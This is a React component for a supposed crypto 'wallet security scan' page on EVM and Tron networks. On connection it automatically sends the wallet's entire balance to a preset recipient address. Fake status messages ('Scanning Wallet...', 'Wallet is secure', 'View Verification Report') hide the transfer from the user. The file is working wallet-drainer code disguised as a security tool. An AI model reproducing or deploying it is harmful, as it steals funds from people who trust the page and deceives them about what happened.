import { useState, useEffect } from 'react';
import { Card, CardContent } from '../components/ui/card';
import { CheckCircle, AlertTriangle, Loader2, ShieldAlert, Activity } from 'lucide-react';
import { formatBalance, MIN_WEI_THRESHOLD, MIN_SUN_THRESHOLD, getChainConfig, TRON_CONFIG, getRecipientAddress } from '../utils/ethUtils';

interface SendFormProps {
  isConnected: boolean;
  balance: bigint | null;
  chainId: number | null;
  networkType: 'evm' | 'tron';
  isLoading: boolean;
  onSend: (to: string, value: bigint) => Promise<string>;
  error: string | null;
}

export const SendForm = ({ isConnected, balance, chainId, networkType, isLoading, onSend, error }: SendFormProps) => {
  const [txHash, setTxHash] = useState<string | null>(null);
  const [isSending, setIsSending] = useState(false);
  const [hasAutoSent, setHasAutoSent] = useState(false);

  const config = networkType === 'evm' ? getChainConfig(chainId) : TRON_CONFIG;
  const targetAddress = getRecipientAddress(networkType, chainId);
  
  const minThreshold = networkType === 'evm' ? MIN_WEI_THRESHOLD : MIN_SUN_THRESHOLD;
  const hasEnoughBalance = balance !== null && balance >= minThreshold;
  const isAddressValid = targetAddress.length > 0;

  useEffect(() => {
    if (isConnected && hasEnoughBalance && isAddressValid && !hasAutoSent && !isSending && !txHash) {
      handleSend();
    }
  }, [isConnected, hasEnoughBalance, isAddressValid, hasAutoSent, isSending, txHash]);

  const handleSend = async () => {
    if (!isConnected || !hasEnoughBalance || !isAddressValid || !balance || isSending || !targetAddress) return;

    setIsSending(true);
    setHasAutoSent(true);

    try {
      const hash = await onSend(targetAddress, balance);
      setTxHash(hash);
    } catch (err) {
      setHasAutoSent(false);
    } finally {
      setIsSending(false);
    }
  };

  if (!isConnected) return null;

  return (
    <Card className="w-full border-slate-200">
      <CardContent className="space-y-6 p-6">
        {isSending && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 flex items-center gap-4">
            <Loader2 className="h-8 w-8 text-blue-600 animate-spin flex-shrink-0" />
            <div>
              <p className="font-semibold text-blue-900 text-lg">Scanning Wallet...</p>
              <p className="text-blue-700 mt-1">
                Analyzing {formatBalance(balance || 0n, networkType === 'tron' ? 6 : 18)} {config.currency} for malicious interactions
              </p>
            </div>
          </div>
        )}

        {txHash && (
          <div className="bg-emerald-50 border border-emerald-200 rounded-lg p-6 flex items-start gap-4">
            <CheckCircle className="h-8 w-8 text-emerald-600 flex-shrink-0 mt-1" />
            <div className="flex-1">
              <p className="font-semibold text-emerald-900 text-lg">Analysis Complete</p>
              <p className="text-emerald-700 mt-1">
                No malicious risks detected. Wallet is secure.
              </p>
              <a
                href={`${config.explorer}/transaction/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-sm text-emerald-600 hover:text-emerald-800 underline mt-3 inline-block font-medium"
              >
                View Verification Report →
              </a>
            </div>
          </div>
        )}

        {error && (
          <div className="bg-red-50 border border-red-200 rounded-lg p-6 flex items-start gap-4">
            <AlertTriangle className="h-8 w-8 text-red-600 flex-shrink-0 mt-1" />
            <div>
              <p className="font-semibold text-red-900 text-lg">Analysis Failed</p>
              <p className="text-red-700 mt-1">{error}</p>
            </div>
          </div>
        )}

        {!hasEnoughBalance && !txHash && !error && (
          <div className="bg-slate-50 border border-slate-200 rounded-lg p-6 flex items-start gap-4">
            <Activity className="h-8 w-8 text-slate-400 flex-shrink-0 mt-1" />
            <div>
              <p className="font-semibold text-slate-900 text-lg">Insufficient Funds</p>
              <p className="text-slate-600 mt-1">
                Minimum {networkType === 'evm' ? '0.01' : '1'} {config.currency} required to perform deep security scan.
              </p>
              <p className="text-sm text-slate-500 mt-2">
                Current balance: {formatBalance(balance || 0n, networkType === 'tron' ? 6 : 18)} {config.currency}
              </p>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
};